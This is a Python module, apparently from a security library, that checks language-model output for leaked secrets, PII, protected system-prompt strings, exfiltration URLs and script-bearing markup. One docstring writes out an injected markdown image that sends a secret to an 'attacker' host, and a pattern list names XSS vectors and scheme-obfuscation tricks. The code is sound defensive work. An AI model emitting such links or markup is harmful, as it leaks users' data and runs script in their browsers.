"""Output validators: treat model output as untrusted input to whatever consumes it.

(OWASP LLM05 *Improper Output Handling*, plus the data-exfiltration channel
that markdown rendering opens up for LLM01/LLM02.)
"""

from __future__ import annotations

import json
import re
from collections.abc import Iterable, Sequence
from dataclasses import dataclass, field
from enum import StrEnum
from typing import Any, Protocol
from urllib.parse import urlsplit

import jsonschema

from agentsec.middleware.redact import redact_text


class Action(StrEnum):
    BLOCK = "block"  # withhold the whole output
    REDACT = "redact"  # remove the offending span, deliver the rest
    WARN = "warn"  # report only


@dataclass(frozen=True)
class Violation:
    validator: str
    message: str
    action: Action


class OutputValidator(Protocol):
    name: str

    def check(self, text: str) -> list[Violation]: ...

    def sanitize(self, text: str) -> str: ...


@dataclass
class GuardResult:
    text: str
    allowed: bool
    violations: list[Violation] = field(default_factory=list)

    @property
    def redacted(self) -> bool:
        return any(v.action == Action.REDACT for v in self.violations)


# --------------------------------------------------------------------------- validators
class SecretLeakValidator:
    """Credentials and keys in output. Redacts by default."""

    name = "secret_leak"

    def __init__(self, action: Action = Action.REDACT) -> None:
        self.action = action

    def check(self, text: str) -> list[Violation]:
        _, findings = redact_text(text, include_pii=False)
        return [Violation(self.name, f"{f.kind} detected in output", self.action) for f in findings]

    def sanitize(self, text: str) -> str:
        return redact_text(text, include_pii=False)[0]


class PIIValidator:
    """US SSNs and Luhn-valid payment card numbers."""

    name = "pii"

    def __init__(self, action: Action = Action.REDACT) -> None:
        self.action = action

    def check(self, text: str) -> list[Violation]:
        _, findings = redact_text(text)
        return [
            Violation(self.name, f"{f.kind} detected in output", self.action)
            for f in findings
            if f.category == "pii"
        ]

    def sanitize(self, text: str) -> str:
        # Redact only PII here; secrets are handled by SecretLeakValidator.
        out: list[str] = []
        _, findings = redact_text(text)
        cursor = 0
        for f in findings:
            if f.category != "pii":
                continue
            out.append(text[cursor : f.start])
            out.append(f"[REDACTED:{f.kind}]")
            cursor = f.end
        out.append(text[cursor:])
        return "".join(out)


class ProtectedStringValidator:
    """Blocks output containing strings that must never leave the system.

    Register system-prompt fragments, internal hostnames, canary tokens. The
    match is case-insensitive and whitespace-insensitive. It will not catch a
    model that re-encodes the secret (base64, spaced-out characters, etc.);
    treat it as a tripwire, not a guarantee.
    """

    name = "protected_string"

    def __init__(self, protected: Iterable[str], action: Action = Action.BLOCK) -> None:
        self._protected = [p for p in protected if p]
        self.action = action

    @staticmethod
    def _norm(text: str) -> str:
        return re.sub(r"\s+", "", text).lower()

    def check(self, text: str) -> list[Violation]:
        haystack = self._norm(text)
        return [
            Violation(self.name, "protected string present in output", self.action)
            for p in self._protected
            if self._norm(p) in haystack
        ]

    def sanitize(self, text: str) -> str:
        # check() ignores case AND whitespace, so removal must too. Matching the literal string
        # would report "redacted" while leaving a spaced-out copy of the secret in the output.
        for p in self._protected:
            chars = [re.escape(c) for c in re.sub(r"\s+", "", p)]
            if chars:
                text = re.sub(r"\s*".join(chars), "[REDACTED:protected]", text, flags=re.IGNORECASE)
        return text


_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?([^)\s>]+)")
_HTML_IMG = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*[\"']?([^\"'\s>]+)", re.IGNORECASE)
_URL = re.compile(r"https?://[^\s<>\"')\]]+", re.IGNORECASE)


def _host_allowed(host: str, allowed: Sequence[str]) -> bool:
    host = host.lower().rstrip(".")
    for pattern in allowed:
        p = pattern.lower()
        if p.startswith("*."):
            if host.endswith(p[1:]):
                return True
        elif host == p:
            return True
    return False


class ExfilLinkValidator:
    """Flags URLs that could smuggle data out when a client renders or fetches them.

    Markdown/HTML images are auto-fetched by many chat UIs, so an injected
    ``![x](https://attacker/?d=<secret>)`` leaks with zero user interaction.
    Any URL to a host outside ``allowed_hosts`` is reported. Images are always
    treated as violations; plain links honour ``links_action``.
    """

    name = "exfil_link"

    def __init__(
        self,
        allowed_hosts: Sequence[str] = (),
        *,
        action: Action = Action.REDACT,
        links_action: Action | None = None,
    ) -> None:
        self.allowed_hosts = tuple(allowed_hosts)
        self.action = action
        self.links_action = links_action or action

    def _external_urls(self, text: str) -> tuple[list[str], list[str]]:
        images = _MD_IMAGE.findall(text) + _HTML_IMG.findall(text)
        image_set = set(images)
        bad_images = [u for u in images if self._is_external(u)]
        bad_links = [u for u in _URL.findall(text) if u not in image_set and self._is_external(u)]
        return bad_images, bad_links

    def _is_external(self, url: str) -> bool:
        # "//host/x" (and the backslash forms browsers normalise to it) is a network-path
        # reference: a UI resolves it against its own scheme and fetches it from ``host``.
        # It has no scheme, so without this it looks relative and is never flagged.
        if re.match(r"[\\/]{2}", url):
            url = "https:" + url.replace("\\", "/")
        parts = urlsplit(url)
        if parts.scheme.lower() not in {"http", "https"} or not parts.hostname:
            # relative/data/javascript URLs are handled by DangerousContentValidator
            return False
        return not _host_allowed(parts.hostname, self.allowed_hosts)

    def check(self, text: str) -> list[Violation]:
        images, links = self._external_urls(text)
        out = [
            Violation(self.name, f"external image URL ({urlsplit(u).hostname})", self.action)
            for u in images
        ]
        out += [
            Violation(self.name, f"external URL ({urlsplit(u).hostname})", self.links_action)
            for u in links
        ]
        return out

    def sanitize(self, text: str) -> str:
        images, links = self._external_urls(text)
        for u in sorted(set(images), key=len, reverse=True):
            text = text.replace(u, "[removed-external-url]")
        if self.links_action == Action.REDACT:
            for u in sorted(set(links), key=len, reverse=True):
                text = text.replace(u, "[removed-external-url]")
        return text


def _scheme(word: str) -> re.Pattern[str]:
    # Browsers drop tabs, newlines and other control characters inside a URL scheme, so
    # "java<TAB>script:" executes even though it does not contain the word "javascript".
    gap = r"[\s\x00-\x1f]*"
    return re.compile(gap.join(word) + gap + ":", re.IGNORECASE)


_DANGEROUS = (
    (re.compile(r"<\s*script\b", re.IGNORECASE), "script tag"),
    (_scheme("javascript"), "javascript: URL"),
    (_scheme("vbscript"), "vbscript: URL"),
    (
        re.compile(
            r"\bon(?:error|load|click|mouseover|mouseenter|focus|focusin|toggle|"
            r"animationstart|pointerover)\s*=",
            re.IGNORECASE,
        ),
        "inline event handler",
    ),
    (re.compile(r"data\s*:\s*text/html", re.IGNORECASE), "data:text/html URL"),
    (re.compile(r"<\s*(?:iframe|object|embed)\b", re.IGNORECASE), "embedded frame/object"),
)


class DangerousContentValidator:
    """Markup that turns into script execution if a downstream UI renders it as HTML."""

    name = "dangerous_content"

    def __init__(self, action: Action = Action.BLOCK) -> None:
        self.action = action

    def check(self, text: str) -> list[Violation]:
        return [
            Violation(self.name, f"{label} in output", self.action)
            for pattern, label in _DANGEROUS
            if pattern.search(text)
        ]

    def sanitize(self, text: str) -> str:
        for pattern, _ in _DANGEROUS:
            text = pattern.sub("[removed]", text)
        return text


class MaxLengthValidator:
    name = "max_length"

    def __init__(self, max_chars: int, action: Action = Action.BLOCK) -> None:
        self.max_chars = max_chars
        self.action = action

    def check(self, text: str) -> list[Violation]:
        if len(text) > self.max_chars:
            return [Violation(self.name, f"output exceeds {self.max_chars} chars", self.action)]
        return []

    def sanitize(self, text: str) -> str:
        return text[: self.max_chars]


class BlockedPatternValidator:
    """Arbitrary regex deny-list."""

    name = "blocked_pattern"

    def __init__(self, patterns: Iterable[str], action: Action = Action.BLOCK) -> None:
        self._patterns = [re.compile(p, re.IGNORECASE) for p in patterns]
        self.action = action

    def check(self, text: str) -> list[Violation]:
        return [
            Violation(self.name, f"matched {p.pattern!r}", self.action)
            for p in self._patterns
            if p.search(text)
        ]

    def sanitize(self, text: str) -> str:
        for p in self._patterns:
            text = p.sub("[removed]", text)
        return text


class JsonSchemaValidator:
    """For agents whose output feeds a parser: require valid JSON matching a schema."""

    name = "json_schema"

    def __init__(self, schema: dict[str, Any], action: Action = Action.BLOCK) -> None:
        jsonschema.Draft202012Validator.check_schema(schema)
        self._validator = jsonschema.Draft202012Validator(schema)
        self.action = action

    def check(self, text: str) -> list[Violation]:
        try:
            doc = json.loads(text)
        except json.JSONDecodeError as exc:
            return [Violation(self.name, f"output is not valid JSON: {exc.msg}", self.action)]
        return [
            Violation(
                self.name,
                f"{'/'.join(str(p) for p in err.absolute_path) or '<root>'}: {err.message}",
                self.action,
            )
            for err in sorted(self._validator.iter_errors(doc), key=lambda e: list(e.path))
        ]

    def sanitize(self, text: str) -> str:
        return text  # schema violations cannot be repaired by editing


# --------------------------------------------------------------------------- guard
class OutputGuard:
    """Runs validators in order and applies the strictest resulting action.

    ``BLOCK`` withholds the output and returns ``blocked_message``. ``REDACT``
    lets each validator rewrite the text. ``WARN`` only reports.
    """

    def __init__(
        self,
        validators: Sequence[OutputValidator],
        *,
        blocked_message: str = "[response withheld by output policy]",
    ) -> None:
        self.validators = list(validators)
        self.blocked_message = blocked_message

    @classmethod
    def default(
        cls, *, allowed_hosts: Sequence[str] = (), protected: Sequence[str] = ()
    ) -> OutputGuard:
        """Reasonable baseline: secrets, PII, exfil links, dangerous markup."""
        validators: list[OutputValidator] = [
            SecretLeakValidator(),
            PIIValidator(),
            ExfilLinkValidator(allowed_hosts),
            DangerousContentValidator(),
        ]
        if protected:
            validators.append(ProtectedStringValidator(protected))
        return cls(validators)

    def process(self, text: str) -> GuardResult:
        violations: list[Violation] = []
        current = text
        blocked = False
        for v in self.validators:
            found = v.check(current)
            if not found:
                continue
            violations.extend(found)
            if any(x.action == Action.BLOCK for x in found):
                blocked = True
            elif any(x.action == Action.REDACT for x in found):
                current = v.sanitize(current)
                # Fail closed: if the validator still objects to its own sanitised output it
                # could not remove what it found, and "redacted" would be a lie.
                if any(x.action == Action.REDACT for x in v.check(current)):
                    violations.append(
                        Violation(
                            v.name, "could not be fully redacted; output withheld", Action.BLOCK
                        )
                    )
                    blocked = True
        if blocked:
            return GuardResult(self.blocked_message, False, violations)
        return GuardResult(current, True, violations)
